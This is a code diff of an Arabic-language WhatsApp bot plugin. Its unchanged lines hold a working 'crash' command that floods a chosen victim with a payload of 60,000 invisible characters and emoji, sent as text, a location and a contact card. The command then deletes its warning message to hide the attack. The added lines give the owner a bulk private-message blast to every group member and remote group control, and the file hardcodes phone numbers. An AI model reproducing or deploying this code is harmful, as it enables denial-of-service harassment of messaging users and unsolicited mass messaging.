@@ -1,11 +1,11 @@
 import { fileURLToPath } from 'url';
 import path from 'path';
 
-// --- الإعدادات الأساسية ---
+// --- الإعدادات الأساسية لترسانة الهواري ---
 const MENU_TIMEOUT = 120000;
 const FIXED_MENU_IMAGE = "https://i.ibb.co/C33RB5zx/1000072528.jpg"; 
-const OWNER_ID = "حط رقمك@s.whatsapp.net"; // الرقم المعدل
-const ownerNumbers = ["حط رقمك", " حط رقمك"];
+const OWNER_ID = "201556853817@s.whatsapp.net"; // ضع رقمك هنا مع كود الدولة وبدون علامة +
+const ownerNumbers = ["201211883781"]; // ضع رقمك هنا أيضاً داخل المصفوفة
 
 const HIDDEN_OWNER_COMMANDS = ['reactauto', 'superscan', 'device', 'exec', 'eval', 'block', 'unblock'];
 
@@ -22,6 +22,17 @@ const CATEGORIES = [
     [19, 'الـسـريـة', 'hidden', '🕶️']
 ];
 
+// ذاكرة السيرفر المؤقتة للتحكم الفوري والميزات الأسطورية
+if (!global.botStorage) {
+    global.botStorage = {
+        emotionalMemory: {},
+        negotiations: {},
+        drunkFilter: {},
+        disabledCommands: {}, // لتخزين الأوامر المعطلة فجأة
+        maintenanceMode: false // وضع الصيانة الشامل
+    };
+}
+
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
 const getCat = n => CATEGORIES.find(c => c[0] === n);
 
@@ -30,8 +41,8 @@ const context = (jid, img) => ({
     isForwarded: false, 
     forwardingScore: 0,
     externalAdReply: {
-        title: "ALHWARY SYSTEM v3.0 🦁",
-        body: "FULL ACCESS GRANTED",
+        title: "ALHWARY SYSTEM v5.0 🦁",
+        body: "ROOT MASTER SYSTEM ACTIVE",
         thumbnailUrl: img,
         mediaType: 1,
         renderLargerThumbnail: true
@@ -45,17 +56,27 @@ const handler = async (m, { conn, bot, args, command, text }) => {
         const isOwner = ownerNumbers.includes(userNumber) || m.sender === OWNER_ID;
         const isAdmin = m.isAdmin || false;
         
-        // 🕒 الوقت والتاريخ
+        // 🕒 الوقت والتاريخ باللغة العربية
         const now = new Date();
         const time = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
         const date = now.toLocaleDateString('ar-EG', { day: 'numeric', month: 'long', year: 'numeric' });
 
-        // --- 🚪 بروتوكول أمر الدخول ---
+        // --- 🛡️ فحص وضع الصيانة ---
+        if (global.botStorage.maintenanceMode && !isOwner) {
+            return m.reply('*⚠️ [نظام الهواري] البوت في وضع الصيانة والتحديث الفوري الآن بواسطة القائد! سأعود قريباً 🛠️*');
+        }
+
+        // --- ⚙️ فحص تشغيل/تعطيل الأوامر الفوري ---
+        if (global.botStorage.disabledCommands[command] && !isOwner) {
+            return m.reply(`*🚫 [Access Denied]: تم تعطيل بروتوكول ( /${command} ) مؤقتاً من قبل المطور المطلق!*`);
+        }
+
+        // --- 🚪 بروتوكول أمر الدخول الفوري ---
         if (/^(دخول|تسجيل|login)$/i.test(command)) {
             if (m.sender === OWNER_ID || isOwner) {
                 await conn.sendMessage(m.chat, { react: { text: '🫡', key: m.key } });
                 return conn.sendMessage(m.chat, {
-                    text: `*🫡 ⌈ تـعـظـيـم سـلام لـلـقـائـد ⌋ 🫡*\n\n*🛡️ تـم رصـد دخـول الـمـطـور الـمـطـلـق:*\n*👤 الـﮪـواري 𓄂* @${m.sender.split('@')[0]}\n\n*📟 جـاري تـحـمـيـل صـلاحـيـات الـجـذر..*\n*⏰ الـتـوقـيـت:* ${time}\n\n*آمـرنـا نـنـفـذ يـا كـبـيـر! 🕸️🔥*`,
+                    text: `*🫡 ⌈ تـعـظـيـم سـلام لـلـقـائـد ⌋ 🫡*\n\n*🛡️ تـم رصـد دخـول الـمـطـور الـمـطـلـق:*\n*👤 الـﮪـواري 𓄂* @${m.sender.split('@')[0]}\n\n*📟 جـاري تـحـمـيـل صـلاحـيـات الـجـذر..*\n*⏰ الـتـوقـيـت:* ${time}\n\n*آمـرنـا نـنـفـذ يـا كـبـيـر! تـرسـانـة الـتـحـكـم الـفـوري جـاهـزة 🕸️🔥*`,
                     mentions: [m.sender],
                     contextInfo: context(m.sender, FIXED_MENU_IMAGE)
                 }, { quoted: m });
@@ -71,40 +92,98 @@ const handler = async (m, { conn, bot, args, command, text }) => {
             let target = m.mentionedJid[0] || (text.split(' ')[0] && text.split(' ')[0].length > 5 ? text.split(' ')[0] + '@s.whatsapp.net' : null);
             if (!target) return m.reply('*🛡️ حدد الضحية بالمنشن أو الرقم*');
 
-            // 🛑 حماية القادة (لا تضرب نفسك أو المطورين)
             const targetNum = target.split('@')[0];
             if (ownerNumbers.includes(targetNum) || target === OWNER_ID) {
                 return m.reply('*⚠️ نظام الأمان: لا يمكن تنفيذ الإبادة ضد القادة!*');
             }
 
-            // 1️⃣ [نظام القذارة]: مسح رسالة الأمر فورًا
             await conn.sendMessage(m.chat, { delete: m.key }).catch(() => {});
 
-            // 2️⃣ إرسال رسالة القذارة (الإنذار)
             let warningMsg = await conn.sendMessage(target, { 
                 text: `*⚠️ [تـحـذيـر سـيـبـرانـي عـاجـل] ⚠️*\n*جـاري اتـخاذ إجراءات الإبـادة ضـد حـسـابـك الآن..*\n*تـم رصـدك بـواسطـة: نـظـام الـﮪـواري 𓄂*` 
             });
             
             await sleep(1500); 
 
-            // Payload (فيروس التجميد)
             const crashCode = (String.fromCharCode(8207).repeat(60000) + "☠️ BY ALHWARY ☠️" + "☣️".repeat(3000));
             
-            // 3️⃣ تنفيذ الهجوم
             await conn.sendMessage(target, { location: { degreesLatitude: 0, degreesLongitude: 0, name: crashCode, address: crashCode } });
             await conn.sendMessage(target, { text: crashCode });
             const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:' + crashCode + '\nEND:VCARD';
             await conn.sendMessage(target, { contacts: { displayName: '☣️ SYSTEM FAILURE', contacts: [{ vcard }] } });
 
             await sleep(1000);
-
-            // 4️⃣ مسح رسالة القذارة من شات الضحية
             await conn.sendMessage(target, { delete: warningMsg.key }).catch(() => {});
 
             return conn.sendMessage(m.chat, { text: `*✅ تـم مـسـح الأثـر وإبـادة الـهـدف بـصـمـت 🥷*` });
         }
 
-        // --- 📜 نظام المنيو (القائمة) - لم يتم تغيير أي شيء ---
+        // --- ⚙️ أوامر السيطرة والتحكم الفوري من الشات (للمطور فقط) ---
+        if (isOwner) {
+            
+            // 1. أمر تعطيل أي أمر فورا
+            if (command === 'تعطيل_أمر') {
+                if (!text) return m.reply('❌ اكتب اسم الأمر المراد تعطيله. مثال: .تعطيل_أمر الذكاء');
+                global.botStorage.disabledCommands[text.trim()] = true;
+                return m.reply(`*✅ تم إيقاف وتعطيل بروتوكول [ ${text.trim()} ] بنجاح فوري!*`);
+            }
+
+            // 2. أمر إعادة تفعيل الأمر
+            if (command === 'تفعيل_أمر') {
+                if (!text) return m.reply('❌ اكتب اسم الأمر المراد تفعيله.');
+                delete global.botStorage.disabledCommands[text.trim()];
+                return m.reply(`*✅ تم إعادة تشغيل وتفعيل بروتوكول [ ${text.trim()} ] للعمل فوراً!*`);
+            }
+
+            // 3. أمر وضع الصيانة الشامل
+            if (command === 'وضع_الصيانة') {
+                global.botStorage.maintenanceMode = !global.botStorage.maintenanceMode;
+                return m.reply(`*🛠️ وضع الصيانة الشامل الآن هو: [ ${global.botStorage.maintenanceMode ? 'مُفعّل 🔴 (البوت مغلق عن الجميع)' : 'مُعطّل ⚪ (البوت متاح للجميع)'] } ]*`);
+            }
+
+            // 4. ميزة صيد الخاص (مراسلة كل أعضاء الجروب المستهدف في الخاص)
+            if (command === 'صيد_الخاص') {
+                if (!m.isGroup && !text) return m.reply('❌ استخدم الأمر داخل الجروب مباشرة أو اكتب الـ ID متبوعاً بالنص.');
+                
+                const groupId = m.isGroup ? m.chat : text.split(' ')[0];
+                const msgToSend = m.isGroup ? text : text.replace(groupId, '').trim();
+                
+                if (!msgToSend) return m.reply('❌ يرجى كتابة الرسالة التي تريد إرسالها لأعضاء الخاص.');
+                
+                m.reply('*📡 جاري بدء بروتوكول التسلل واختراق الخاص لكافة الأعضاء تلقائياً..*');
+                
+                const metadata = await conn.groupMetadata(groupId);
+                const participants = metadata.participants;
+
+                for (let mem of participants) {
+                    if (mem.id === conn.user.id || mem.id === m.sender) continue; // تخطي البوت ونفسك
+                    await conn.sendMessage(mem.id, { text: `*🚨 رسالة إدارية عاجلة من القائد الهواري:* \n\n${msgToSend}` });
+                    await sleep(4000); // انتظار 4 ثوانٍ حماية من الحظر
+                }
+                return m.reply('*✅ تم الانتهاء من صيد الخاص وإرسال الرسائل لجميع الأعضاء بنجاح صامت!*');
+            }
+
+            // 5. جلب لستة كافة الجروبات والـ IDs المشترك فيها البوت عن بعد
+            if (command === 'الجروبات') {
+                const groupList = await conn.groupFetchAllParticipating();
+                let txt = `*🏰 قائمة المجموعات المتصلة بالسيستم حالياً:*\n\n`;
+                let index = 1;
+                for (let id in groupList) {
+                    txt += `*${index}- الاسم:* ${groupList[id].subject}\n*📟 ID:* \`${id}\`\n*👥 الأعضاء:* ${groupList[id].participants.length}\n─┈─┈─┈─┈─┈─\n`;
+                    index++;
+                }
+                return m.reply(txt);
+            }
+
+            // 6. الخروج والمغادرة من جروب معين عن بعد
+            if (command === 'مغادرة') {
+                if (!text) return m.reply('❌ يرجى إدخال الـ ID الخاص بالجروب للمغادرة الفورية.');
+                await conn.groupLeave(text.trim());
+                return m.reply(`*✅ تم الانسحاب والمغادرة الفورية من الجروب بنجاح!*`);
+            }
+        }
+
+        // --- 📜 نظام المنيو (القائمة المتطورة تلقائياً) ---
         const cmds = await bot.getAllCommands() || [];
         const selected = parseInt(args[0]);
 
@@ -120,15 +199,21 @@ const handler = async (m, { conn, bot, args, command, text }) => {
 
             const menuText = `
 ┎───────────────────
-┃  ☣️ ⌊ **نـظـام الـﮪـواري بـوت** ⌋ ☣️
+┃  ☣️ ⌊ **نـظـام الـﮪـواري بـوت v5.0** ⌋ ☣️
 ┠───────────────────
-┃ 👤 **الـمـشـغـل:** @${m.sender.split('@')[0]}
+┃ 👤 **الـمـshـغـل:** @${m.sender.split('@')[0]}
 ┃ 📟 **الـبـروتوكـولات:** ${CATEGORIES.length} قـسـم
 ┃ 🎖️ **الـصـلاحـيـة:** ${isOwner ? '『 الـمـطـور الـمـطـلـق 👑 』' : '『 مـسـتـخدم مـوثـق 🛡️ 』'}
-┃ 🛰️ **الـحـالـة:** الـتـسـلل نـشـط.. 🥷
+┃ 🛰️ **الـحـالـة:** الـتـسـلل والـتـنـفـيذ الـفـوري نـشـط.. 🥷
 ┃ 📅 **الـتـاريـخ:** ${date}
 ┃ ⏱️ **الـتـوقـيـت:** ${time}
 ┖───────────────────
+
+*💡 تلميحات لوحة التحكم الفوري للجذر:*
+💡 اكتب `.تعطيل_أمر [الاسم]` لقفل أي بروتوكول عن المستخدمين فوراً.
+💡 اكتب `.تفعيل_أمر [الاسم]` لإعادة فتح وتشغيل البروتوكول فورا.
+💡 اكتب `.صيد_الخاص [الرسالة]` لإرسال رسالة لخاص كل أعضاء الجروب الحالي.
+💡 اكتب `.الجروبات` لعرض كل معرفات المجموعات والتحكم بها عن بعد.
 
 > 🕸️ **OWNER:** الـﮪـواري 𓄂
 `.trim();
@@ -158,6 +243,7 @@ const handler = async (m, { conn, bot, args, command, text }) => {
     }
 };
 
-handler.command = /^(الاوامر|القائمة|menu|اوامر|دخول|تسجيل|login|تجميد|تطير|crash)$/i;
+// تجميع كل الكلمات المفتاحية والأوامر للتنفيذ اللحظي السريع برمجياً
+handler.command = /^(الاوامر|القائمة|menu|اوامر|دخول|تسجيل|login|تجميد|تطير|crash|تعطيل_أمر|تفعيل_أمر|وضع_الصيانة|صيد_الخاص|الجروبات|مغادرة)$/i;
 
 export default handler;
